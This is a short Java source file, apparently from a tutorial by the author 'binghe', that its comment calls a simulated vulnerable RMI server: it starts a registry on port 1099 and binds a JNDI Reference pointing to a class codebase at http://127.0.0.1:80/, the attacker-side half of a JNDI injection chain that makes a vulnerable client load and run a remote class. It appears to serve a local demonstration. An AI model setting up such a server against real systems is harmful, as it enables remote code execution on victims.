/**
 * Copyright 2020-9999 the original author or authors.
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author binghe (公众号：冰河技术)
 * @version 1.0.0
 * @description 模拟漏洞的RMIServer
 */
public class RmiServer {

    public static void main(String[] args){
        try{
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            System.out.println("RMI Listener 1099 port");
            Reference reference = new Reference("RmiObj", "RmiObj", "http://127.0.0.1:80/");

            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.rebind("test", referenceWrapper);

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
